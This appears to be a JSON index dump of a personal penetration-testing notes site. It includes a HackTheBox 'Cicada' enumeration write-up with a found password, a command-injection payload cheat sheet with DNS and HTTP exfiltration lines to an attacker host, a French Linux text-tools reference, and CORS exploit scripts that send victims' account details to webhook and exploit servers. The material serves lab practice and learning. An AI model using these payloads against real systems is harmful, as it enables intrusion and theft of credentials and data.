class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: cicada.htb0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eCICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-08-22T20:24:16\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: TLS randomness does not represent \u003cspan class=\"nb\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: CICADA-DC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: 6h59m58s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-09-29T17:24:25\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.129.21.236 -u \u003cspan class=\"s1\"\u003e\u0026#39;guest\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e --rid-brute \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s1\"\u003e\u0026#39;\\\\\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s1\"\u003e$\u0026#39;\\\\\u0026#39;\u003c/span\u003e -f2 \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e -f1 \u003cspan class=\"p\"\u003e|\u003c/span\u003e tee -a users_rid.txt\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esmbclient.py cicada.htb/guest:\u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e@10.129.21.236\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003ewe find a note with a password : Cicada$M6Corpb*@Lp#nZp!8 \u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Cicada"},{"content":" Command Injection/Execution : #Both Unix and Windows supported ls||id; ls ||id; ls|| id; ls || id # Execute both ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe) ls\u0026amp;\u0026amp;id; ls \u0026amp;\u0026amp;id; ls\u0026amp;\u0026amp; id; ls \u0026amp;\u0026amp; id # Execute 2º if 1º finish ok ls\u0026amp;id; ls \u0026amp;id; ls\u0026amp; id; ls \u0026amp; id # Execute both but you can only see the output of the 2º ls %0A id # %0A Execute both (RECOMMENDED) #Only unix supported `ls` # `` $(ls) # $() ls; id # ; Chain commands ls${LS_COLORS:10:1}${IFS}id # Might be useful 0x0a or \\n #Newline #Not executed but may be interesting \u0026gt; /var/www/html/out.txt #Try to redirect the output to a file \u0026lt; /etc/passwd #Try to send some input to the command\rDetecting blind OS command injection : \u0026amp; ping -c 10 127.0.0.1 \u0026amp; #Request Post : name=dede\u0026amp;email=test%40gmail.com||+ping+-c+10+127.0.0.1+||\u0026amp;subject=dede\u0026amp;message=deeeeeeeeeeee\rDon't forget to try every possibilities !\nOutput redirection: name=test\u0026amp;email=||whoami\u0026gt;/var/www/images/output.txt||\u0026amp;subject=test\u0026amp;message=test\rRCE - Exfiltrating via DNS curl http://$(whoami).site.com/ curl http://`whoami`.site.com/ nslookup `whoami`.attacker-server.com \u0026amp;\r","date":"2023-09-07","id":32,"permalink":"/notes/web/command-injection/","summary":"\u003cul\u003e\n\u003cli\u003eCommand Injection/Execution :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Both Unix and Windows supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els\u003cspan class=\"o\"\u003e||\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"o\"\u003e||\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls\u003cspan class=\"o\"\u003e||\u003c/span\u003e id\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"o\"\u003e||\u003c/span\u003e id \u003cspan class=\"c1\"\u003e# Execute both\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els\u003cspan class=\"p\"\u003e|\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"p\"\u003e|\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls\u003cspan class=\"p\"\u003e|\u003c/span\u003e id\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"p\"\u003e|\u003c/span\u003e id \u003cspan class=\"c1\"\u003e# Execute both (using a pipe)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els\u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls\u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e id\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e id \u003cspan class=\"c1\"\u003e#  Execute 2º if 1º finish ok\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003eid\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e id\u003cspan class=\"p\"\u003e;\u003c/span\u003e ls \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e id \u003cspan class=\"c1\"\u003e# Execute both but you can only see the output of the 2º\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els %0A id \u003cspan class=\"c1\"\u003e# %0A Execute both (RECOMMENDED)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Only unix supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003els\u003cspan class=\"sb\"\u003e`\u003c/span\u003e \u003cspan class=\"c1\"\u003e# ``\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003els\u003cspan class=\"k\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# $()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els\u003cspan class=\"p\"\u003e;\u003c/span\u003e id \u003cspan class=\"c1\"\u003e# ; Chain commands\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003els\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eLS_COLORS\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e1\u003c/span\u003e\u003cspan class=\"si\"\u003e}${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIFS\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003eid \u003cspan class=\"c1\"\u003e# Might be useful\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0x0a or \u003cspan class=\"se\"\u003e\\n\u003c/span\u003e \u003cspan class=\"c1\"\u003e#Newline \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Not executed but may be interesting\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026gt; /var/www/html/out.txt \u003cspan class=\"c1\"\u003e#Try to redirect the output to a file\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt; /etc/passwd \u003cspan class=\"c1\"\u003e#Try to send some input to the command\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDetecting blind OS command injection :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e ping -c \u003cspan class=\"m\"\u003e10\u003c/span\u003e 127.0.0.1 \u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Request Post :\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edede\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003eemail\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etest%40gmail.com\u003cspan class=\"o\"\u003e||\u003c/span\u003e+ping+-c+10+127.0.0.1+\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esubject\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edede\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003emessage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003edeeeeeeeeeeee\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003eDon't forget to try every possibilities !\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Command Injection"},{"content":"Introduction à awk awk est utilisé pour manipuler des données structurées en lignes et colonnes. Il peut effectuer des opérations de filtrage, de transformation, et de calcul sur des fichiers texte.\nSyntaxe de Base: awk \u0026#39;motif { action }\u0026#39; fichier\rmotif : Condition pour exécuter une action. action : Instructions exécutées si le motif est vrai.\nExemples d\u0026rsquo;Utilisation:\nAfficher une colonne spécifique : awk \u0026#39;{print $2}\u0026#39; fichier.txt\rCalculer une somme :\nawk \u0026#39;{somme += $2} END {print somme}\u0026#39; fichier.txt\rFiltrer des lignes :\nawk \u0026#39;$2 \u0026gt; 100\u0026#39; fichier.txt\rAffiche les lignes où la deuxième colonne est supérieure à 100.\nFonctions BEGIN et END BEGIN : Exécute avant de lire les lignes. END : Exécute après avoir lu toutes les lignes.\nExemple avec BEGIN et END awk \u0026#39;BEGIN {print \u0026#34;Début\u0026#34;} {print $0} END {print \u0026#34;Fin\u0026#34;}\u0026#39; fichier.txt\rIntroduction à sed sed est utilisé pour la manipulation de flux de texte. Il peut effectuer des opérations de recherche et remplacement, supprimer des lignes, insérer du texte, etc. Syntaxe de Base\nsed \u0026#39;commande\u0026#39; fichier\rcommande : Instruction à appliquer sur chaque ligne.\nExemples d\u0026rsquo;Utilisation\nRemplacer du texte : sed \u0026#39;s/ancien/nouveau/g\u0026#39; fichier.txt\rRemplace toutes les occurrences de \u0026ldquo;ancien\u0026rdquo; par \u0026ldquo;nouveau\u0026rdquo;.\nSupprimer des lignes : sed \u0026#39;/motif/d\u0026#39; fichier.txt\rSupprime les lignes contenant \u0026ldquo;motif\u0026rdquo;.\nInsérer du texte avant une ligne : sed \u0026#39;/motif/i Texte ajouté avant\u0026#39; fichier.txt\rAjoute \u0026ldquo;Texte ajouté avant\u0026rdquo; avant chaque ligne contenant \u0026ldquo;motif\u0026rdquo;.\nSupprime les lignes qui contiennent uniquement produit sed -e \u0026#39;/^Produit$/d\u0026#39; fichier.txt Supprime les lignes vides. sed -e \u0026#39;/^$/d\u0026#39; fichier.txt\rThen you can also combien multiple sed commande :\nawk \u0026#39;{print $2}\u0026#39; ban.txt | sed -e \u0026#39;/^Produit$/d\u0026#39; -e \u0026#39;/^$/d\u0026#39;\rRemove one specific letter. sed -i \u0026#39;s/$//g\u0026#39; fichier.txt\rIntroduction à grep Rechercher un motif simple : grep \u0026#39;motif\u0026#39; fichier\rRechercher en ignorant la casse : grep -i \u0026#39;motif\u0026#39; fichier.txt\rAfficher les numéros de ligne : grep -n \u0026#39;motif\u0026#39; fichier.txt\rWC -l : Compte le nombre de lignes. -w : Compte le nombre de mots. -c : Compte le nombre de caractères. -m : Compte le nombre de caractères (identique à -c mais pour les caractères multioctets). -L : Affiche la longueur de la ligne la plus longue.\rSort -n : Trie numériquement. -r : Trie dans l ordre inverse. -k : Trie par clé (colonne) spécifiée. -u : Trie et supprime les doublons.\rExample :\nTrier par ordre alphabétique : sort fichier.txt\rTrier numériquement la troisième colonne : sort -k 3 -n fichier.txt\rTrier en ordre inverse : sort -r fichier.txt\rUniq La commande uniq supprime les doublons consécutifs dans un fichier trié.\n-c : Précède chaque ligne par le nombre de fois qu elle apparaît. -d : Affiche uniquement les lignes dupliquées. -u : Affiche uniquement les lignes uniques.\rHead La commande head affiche les premières lignes d\u0026rsquo;un fichier.\n-n : Spécifie le nombre de lignes à afficher.\rtail La commande head affiche les dernières lignes d\u0026rsquo;un fichier.\n-n : Spécifie le nombre de lignes à afficher.\rCut La commande cut extrait des sections de chaque ligne d\u0026rsquo;un fichier.\n-d : Spécifie le délimiteur (par défaut, la tabulation). -f : Spécifie les champs (colonnes) à extraire.\rExtraire la deuxième colonne : cut -d \u0026#39; \u0026#39; -f 2 fichier.txt\rExtraire les colonnes 2 à 4 : cut -d \u0026#39; \u0026#39; -f 2-4 fichier.txt\r#clean_arp_cache\nip -s -s neigh flush all\rConversion using ruby : \u0026#34;A\u0026#34;.ord # =\u0026gt; 65 65.chr # =\u0026gt; \u0026#34;A\u0026#34;\rPasser de maj a minuscule : cat fichier.txt | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \u0026gt; fichier_minuscule.txt\r","date":"2023-09-07","id":33,"permalink":"/notes/ressources/command-linux/","summary":"\u003ch5 id=\"introduction-à-awk\"\u003eIntroduction à awk\u003c/h5\u003e\n\u003cp\u003eawk est utilisé pour manipuler des données structurées en lignes et colonnes. Il peut effectuer des opérations de filtrage, de transformation, et de calcul sur des fichiers texte.\u003c/p\u003e","tags":[],"title":"Command Linux"},{"content":"Basic Cors Misconfiguration : Access-Control-Allow-Origin * \u0026amp;\u0026amp; Access-Control-Allow-Credentials is True\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var req = new XMLHttpRequest(); var url = (\u0026#34;https://0a08009804f217fe803f21a500fa0046.web-security-academy.net\u0026#34;); req.onload = retrieveKeys; req.open(\u0026#39;GET\u0026#39;, url + \u0026#34;/accountDetails\u0026#34;,true); req.withCredentials = true; req.send(null); function retrieveKeys() { location=\u0026#39;https://webhook.site/383f0fd1-02c0-4dfa-a570-a146e498e388/log?key=\u0026#39;+this.responseText; }; \u0026lt;/script\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/html\u0026gt;\rNull Origin : Sometimes the Null value is accepted so if Origin: null is reflected you can do this : \u0026lt;iframe sandbox=\u0026#39;allow-scripts allow-top-navigation allow-forms\u0026#39; src=\u0026#34;data:text/html,\u0026lt;script\u0026gt; var req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://0a5e006d0328ba97827c602100bb0093.web-security-academy.net/accountDetails\u0026#39;,true); req.withCredentials = true; req.send(); function reqListener() { location=\u0026#39;https://exploit-0a6c006c0386baea820e5f1f013e00e3.exploit-server.net/log?key=\u0026#39;+this.responseText; }; \u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\rXSS + CORs Check Allow origin : If there is an xss in a subdomain you can exploit the Cors , in this case it only accept this domain http://0a8600b203276610850ea08900b8000b.web-security-academy.net and also the subdomain .\nOrigin: http://0a8600b203276610850ea08900b8000b.web-security-academy.net Origin: http://subdomain.0a8600b203276610850ea08900b8000b.web-security-academy.net\rIt then responds with: HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.0a8600b203276610850ea08900b8000b.web-security-academy.net Access-Control-Allow-Credentials: true So you can do this : Don't forget to url the + and \u0026lt; in the script balise to avoid conflic !! \u0026lt;script\u0026gt; document.location=\u0026#34;http://stock.0a8600b203276610850ea08900b8000b.web-security-academy.net/?productId=4\u0026lt;script\u0026gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(\u0026#39;get\u0026#39;,\u0026#39;https://0a8600b203276610850ea08900b8000b.web-security-academy.net/accountDetails\u0026#39;,true); req.withCredentials = true;req.send();function reqListener() {location=\u0026#39;https://exploit-0a51006f03fe66fd85589fa101060074.exploit-server.net/log?key=\u0026#39;%2bthis.responseText; };%3c/script\u0026gt;\u0026amp;storeId=1\u0026#34; \u0026lt;/script\u0026gt;\r","date":"2023-09-07","id":34,"permalink":"/notes/web/cors/","summary":"\u003ch2 id=\"basic-cors-misconfiguration-\"\u003eBasic Cors Misconfiguration :\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eAccess-Control-Allow-Origin * \u0026amp;\u0026amp; Access-Control-Allow-Credentials is True\u003c/code\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;script\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        var \u003cspan class=\"nv\"\u003ereq\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new XMLHttpRequest\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        var \u003cspan class=\"nv\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://0a08009804f217fe803f21a500fa0046.web-security-academy.net\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        req.onload \u003cspan class=\"o\"\u003e=\u003c/span\u003e retrieveKeys\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        req.open\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;GET\u0026#39;\u003c/span\u003e, url + \u003cspan class=\"s2\"\u003e\u0026#34;/accountDetails\u0026#34;\u003c/span\u003e,true\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        req.withCredentials \u003cspan class=\"o\"\u003e=\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        req.send\u003cspan class=\"o\"\u003e(\u003c/span\u003enull\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efunction\u003c/span\u003e retrieveKeys\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003elocation\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://webhook.site/383f0fd1-02c0-4dfa-a570-a146e498e388/log?key=\u0026#39;\u003c/span\u003e+this.responseText\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;/script\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u0026lt;body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003ch2 id=\"null-origin-\"\u003eNull Origin :\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eSometimes the Null value is accepted so if \u003ccode\u003eOrigin: null\u003c/code\u003e is reflected you can do this 